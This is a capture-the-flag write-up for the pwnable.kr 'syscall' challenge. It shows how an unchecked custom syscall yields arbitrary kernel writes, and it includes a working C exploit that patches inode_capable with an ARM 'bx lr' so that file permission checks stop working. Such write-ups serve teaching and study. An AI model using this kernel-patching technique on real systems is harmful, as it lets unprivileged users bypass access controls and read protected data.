+++
title = "pwnable.kr - syscall"
date = 2024-05-03

[taxonomies]
tags = ["pwnable.kr", "linux", "binary exploitation"]
+++

## Finding a primitive

Looking at the code, we find that it adds a syscall with the number
`NR_SYS_UNUSED` (223), and that its source code is as follows:

```c
asmlinkage long sys_upper(char *in, char* out){
    int len = strlen(in);
    int i;
    for(i=0; i<len; i++){
        if(in[i]>=0x61 && in[i]<=0x7a){
            out[i] = in[i] - 0x20;
        }
        else{
            out[i] = in[i];
        }
    }
    return 0;
}
```

> I assumed that the syscall-registering code is fine, and didn't dive too deep into it.
> This will later be revealed to be true, but it's an assumption for now.

At a glance, this seems like a simple function, copying bytes from `in` to `out`, barring a few
stipulations.
It doesn't do _any_ verification on the given pointers, and that allows using it as a worse version
of `memcpy`, with entirely user-controlled addresses.

It doesn't allow copying buffers containing `0x00` (`NULL`) bytes (due to `strlen` checking
for them), but bytes from `0x61` to `0x7a` can be copied, as long as they're inputted with
a `0x20` offset.

In short, **we have an arbitrary write primitive on the kernel's memory**. We can also use it
to read kernel memory, but it's pretty constricted by the aforementioned `NULL`-byte limitation.

## Finding our target

First, we have to understand our end goal. We're supposed to find a flag (string), where is it?
Blindly running `ls` on the system and looking around reveals:

```bash
/ $ ls -l /root
total 1
-r--r-----    1 0        0               56 Oct  1  2014 flag
```

Now our target is clear - we need to read the contents of the file `/root/flag`, which is owned by
the root user/group (UID/GID `0`), and is only allowed to be read by them.

## Research

Given the primitive, it seems like all writeups I found on the internet[^previous-writeups]
chose the approach of giving the current process root permissions,
then reading the file.

When attempting this on my own (before reading the writeups, of course), I thought of a different
approach[^reason-for-writing-this] - there probably exists a function in the kernel, called
somewhere during a call to `read`, which checks if the current process has permissions to read
a file (let's call it `check_file_permissions()`).
What if we could just make that function `return true`? We have arbitrary write.

So, I went searching.

### Finding the real `check_file_permissions`

First, I found out what kernel we're dealing with:

```bash
/ $ cat /proc/version
Linux version 3.11.4 (root@ubuntu) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #13 SMP Fri Jul 11 00:48:31 PDT 2014
```

Then, I opened up [Elixir](https://elixir.bootlin.com/linux/v3.11.4/source/kernel) for easy
searching, and picked `v3.11.4`.

Looking at the files, the first thing that came to mind was to search the `fs` (filesystem)
folder for the `read` function.
Conveniently, the file [`fs/read_write.c`](https://elixir.bootlin.com/linux/v3.11.4/source/fs/read_write.c)
is there.

Among the first lines, I found this struct:

```c
const struct file_operations generic_ro_fops = {
    .llseek      = generic_file_llseek,
    .read        = do_sync_read,
    .aio_read    = generic_file_aio_read,
    .mmap        = generic_file_readonly_mmap,
    .splice_read = generic_file_splice_read,
};
```

`.read` leads to `do_sync_read`, which leads to a call to `aio_read`,
so let's just inspect `generic_file_aio_read`. It's defined in
[`mm/filemap.c`](https://elixir.bootlin.com/linux/v3.11.4/source/mm/filemap.c#L1404).

Reading the function and not diving too deep, I failed to find any clear `check_file_permissions()`
function. Attempting another strategy, I searched the file (simple `Ctrl+F`) for `perm`. That
doesn't find any clear function, but it does find 2 places with **`return -EPERM`**.

Hmm, what if we just searched the `fs` folder for that? There has to be some place like:

```c
if (!check_file_permissions(...)) {
    return -EPERM;
}
```

Elixir found **a lot** of references to `EPERM`, but since I'm interested
in filesystems specifically, I chose to look at `fs/generic_acl.c`[^fs-generic-acl] (assuming ACL
stands for access control lists[^acl], it sounded relevant enough).

[In the file](https://elixir.bootlin.com/linux/v3.11.4/source/fs/generic_acl.c#L77), inside
`generic_acl_set`, I found our coveted code section:

```c
if (!inode_owner_or_capable(inode))
    return -EPERM;
```

However, we don't want to pass an ownership check. We want to pass a read permissions check.

> You can use the next section to try this yourself, and see that just patching the ownership
> check doesn't allow reading the file with `cat`.
>
> Interestingly enough, It doesn't let you `chown` the file either. I wonder why.

Let's [see how it's implemented](https://elixir.bootlin.com/linux/v3.11.4/source/fs/inode.c#L1845):

```c,hl_lines=12-13
/**
 * inode_owner_or_capable - check current task permissions to inode
 * @inode: inode being checked
 *
 * Return true if current either has CAP_FOWNER to the inode, or
 * owns the file.
 */
bool inode_owner_or_capable(const struct inode *inode)
{
    if (uid_eq(current_fsuid(), inode->i_uid))
        return true;
    if (inode_capable(inode, CAP_FOWNER))
        return true;
    return false;
}
EXPORT_SYMBOL(inode_owner_or_capable);
```

Looks like the function we actually want to override is
[`inode_capable`](https://elixir.bootlin.com/linux/v3.11.4/source/kernel/capability.c#L461).

## Patching `check_file_permissions`

(Or `inode_capable`, which is the _real_ version of it - no spoilers in the title!)

Now, we have to make `inode_capable` just `return true`.

### Finding the function's address

The function is exported, so I checked `/proc/kallsyms`[^proc].

```bash
/ $ cat /proc/kallsyms | grep inode_capable
80027cac T inode_capable
```

### Writing our payload

I initially assumed that this was an `x86_64` machine, however, attempting to run the payload
with `x86_64` instructions failed.

Looking at the boot logs[^cpu], I found `CPU: ARMv7 Processor [...]`. Definitely no x86 here.

Well, I don't know much ARM at all, so I headed to [Compiler Explorer](https://godbolt.org/)
to write a simple `return true` program:

```c
bool inode_capable(const struct inode *inode, int cap) {
    return true;
}
```

Choosing an `armv7` compiler, I could see the compiled opcodes on the right. My function looks like:

```arm
sub sp, sp, #8
str r0, [sp, #4]
str r1, [sp]
mov r0, #1
add sp, sp, #8
bx lr
```

From this, I inferred that:

- Parameters are passed in `r0`, `r1` (playing with the code revealed that it's in that order).
- The return value is passed in `r0`.
- To end a function, `bx lr` is called, branching to the link register.

That was great news for me, since:

- `r0` will always have a truthy (non-zero) value when `inode_capable` is called (it should be
    a valid pointer).
- I just needed one opcode (`bx lr`) at the start of the function to end it.

To get the opcode bytes, I enabled `Link to binary` in the output options. `bx lr`
is `0xe12fff1e`. Not `NULL` bytes, or even any bytes in the `0x61`-`0x7a` range (affected by
`sys_upper`), which means I could send the bytes as they are.

## Running the exploit

Now I just needed a small program to call the syscall and put my payload in its place:

```c
#include <unistd.h>

#define NR_SYS_UPPER (223)
#define INODE_CAPABLE_ADDRESS (0x80027cac) // cat /proc/kallsyms
#define ARM_BX_LR ("\x1e\xff\x2f\xe1") // Ends with a NULL byte (literal string)

int main(int argc, char* argv[])
{
    syscall(NR_SYS_UPPER, ARM_BX_LR, INODE_CAPABLE_ADDRESS);
    return 0;
}
```

Then all that was left is to compile it, run it, and get the flag:

```bash
/ $ cd /tmp # We're not allowed to write to `/`
/tmp $ vi exploit.c  # To write the file's contents
/tmp $ gcc exploit.c
/tmp $ ./a.out
/tmp $ cat /root/flag
```

> The machine now doesn't perform _any_ file permission checks until it's restarted again,
> but that's not our problem 😄

And we're done!

Thanks for reading,\
beje

---

## Addendum - How does the kernel actually implement file permission checks?

Remember `inode_owner_or_capable`?

```c
bool inode_owner_or_capable(const struct inode *inode)
{
    if (uid_eq(current_fsuid(), inode->i_uid))
        return true;
    if (inode_capable(inode, CAP_FOWNER))
        return true;
    return false;
}
```

Well, checking out [where `CAP_FOWNER` is defined](https://elixir.bootlin.com/linux/v3.11.4/source/include/uapi/linux/capability.h), we can find
[`CAP_DAC_OVERRIDE`](https://elixir.bootlin.com/linux/v3.11.4/source/include/uapi/linux/capability.h#L104).
Check out its documentation:

```c
/* Override all DAC access, including ACL execute access if
   [_POSIX_ACL] is defined. Excluding DAC access covered by
   CAP_LINUX_IMMUTABLE. */

#define CAP_DAC_OVERRIDE     1
```

That sound very relevant, and following its references, we see its use in
[`fs/namei.c`'s `generic_permissions`](https://elixir.bootlin.com/linux/v3.11.4/source/fs/namei.c#L327).

You can follow it to see what it actually does (and where overriding `inode_capable` helped us).
As a hint, note that when `acl_permission_check` calls `check_acl`, it will always return `-EAGAIN`,
since `CONFIG_FS_POSIX_ACL` is not set:

```bash
/ $ zcat /proc/config.gz | grep ACL
# CONFIG_FS_POSIX_ACL is not set
# CONFIG_TMPFS_POSIX_ACL is not set
# CONFIG_NFS_V3_ACL is not set
```

---

[^previous-writeups]: Some examples:

1. [GitHub - sonysame/pwnable.kr_syscall](https://github.com/sonysame/pwnable.kr_syscall)
2. [pwnable.kr: syscall](https://079035.github.io/blog/syscall)
3. [Pwnable Challenge: Syscall - Alkaline Security Blog](https://alkalinesecurity.com/blog/ctf-writeups/pwnable-challenge-syscall/)
4. [GitHub - agamabergel/pwnable](https://github.com/agamabergel/pwnable/blob/main/syscall-writeup.md)
5. [How to exploit the lack of __user space check in the Linux kernel | by Gergely Bod | Medium](https://medium.com/@geri.bod/how-to-exploit-the-lack-of-user-space-check-in-the-linux-kernel-48e0c0e0fef8)

[^reason-for-writing-this]: Finding out that no one else used my approach why is I posted
    this writeup.

[^fs-generic-acl]: I initially just picked a random filesystem (`ext4`), but in hindsight `generic_acl`
    seems like a more reasonable choice.

[^acl]: `man 5 acl`

[^proc]: `man 5 proc`

[^cpu]: I could've also used `cat /proc/cpuinfo`.
